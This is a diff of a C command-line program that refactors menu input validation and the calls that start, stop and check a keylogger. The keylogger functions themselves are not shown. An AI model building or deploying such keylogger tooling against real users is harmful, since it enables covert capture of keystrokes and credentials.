@@ -13,12 +13,16 @@ int get_validated_choice(int min, int max) {
     int choice = -1;
 
     while (choice < min || choice > max) {
-        //write(STDOUT_FILENO, "Enter your choice: ", 20);
         ssize_t bytes_read = read(STDIN_FILENO, input, sizeof(input) - 1);
 
         if (bytes_read > 0) {
             input[bytes_read - 1] = '\0'; // Replace newline with null terminator
             int is_numeric = 1;
+
+            // Check for empty input (just Enter pressed)
+            if (input[0] == '\0') {
+                return -1; // Return -1 or any other value to indicate a fallback action (e.g., previous menu)
+            }
 
             for (int i = 0; input[i] != '\0'; i++) {
                 if (!isdigit(input[i])) {
@@ -90,12 +94,10 @@ void execute_command_line(int argc, char *argv[]) {
             write(STDERR_FILENO, "Error: Invalid directory operation arguments.\n", 46);
         }
     } else if (mode == 3) { // Keylogger Operations
-        if (operation == 1 && argc >= 5) { // Start Keylogger
-            filename = argv[4];
-            initialize_keylogger(filename);
-        } else if (operation == 2 && argc >= 5) { // Stop Keylogger
-            filename = argv[4];
-            stop_keylogger(filename);
+        if (operation == 1) { // Start Keylogger
+            initialize_keylogger();
+        } else if (operation == 2) { // Stop Keylogger
+            stop_keylogger();
         } else if (operation == 3) { // Check Keylogger Status
             check_keylogger_status();
         } else {
@@ -144,13 +146,12 @@ void display_directory_menu() {
 
 // Handle file operations menu
 void handle_file_operations() {
-    char choice_buf[4];
     int choice;
-
+    
     do {
         display_file_menu();
-        read(STDIN_FILENO, choice_buf, sizeof(choice_buf));
-        choice = atoi(choice_buf);
+        fflush(stdout);
+        choice = get_validated_choice(0, 5);
 
         char filename[256];
         char permissions[4];
@@ -200,13 +201,12 @@ void handle_file_operations() {
 
 // Handle directory operations menu
 void handle_directory_operations() {
-    char choice_buf[4];
     int choice;
 
     do {
         display_directory_menu();
-        read(STDIN_FILENO, choice_buf, sizeof(choice_buf));
-        choice = atoi(choice_buf);
+        fflush(stdout);
+        choice = get_validated_choice(0, 4);
 
         char directory[256];
 
@@ -240,7 +240,6 @@ void handle_directory_operations() {
 
 // Handle keylogger operations menu
 void handle_keylogger_operations() {
-    char logfile[] = "keylog.txt";
 
     int choice;
     do {
@@ -249,18 +248,17 @@ void handle_keylogger_operations() {
         printf("1. Start keylogger\n");
         printf("2. Stop keylogger\n");
         printf("3. Check keylogger status\n");
-        printf("0. Exit program\n");
+        printf("0. Returning to Main Menu\n");
         printf("Enter your choice: ");
-        
-        //scanf("%d", &choice);
+        fflush(stdout);
         choice = get_validated_choice(0, 3);
 
         switch (choice) {
             case 1:
-                initialize_keylogger(logfile);
+                initialize_keylogger();
                 break;
             case 2:
-                stop_keylogger(logfile);
+                stop_keylogger();
                 break;
             case 3:
                 check_keylogger_status();
@@ -271,12 +269,6 @@ void handle_keylogger_operations() {
                 printf("Invalid choice. Please try again.\n");
         }
     }while (choice != 0) ;
-}
-
-
-void clear_input_buffer() {
-    char c;
-    while ((c = getchar()) != '\n' && c != EOF);
 }
 
 int main(int argc, char *argv[]) {
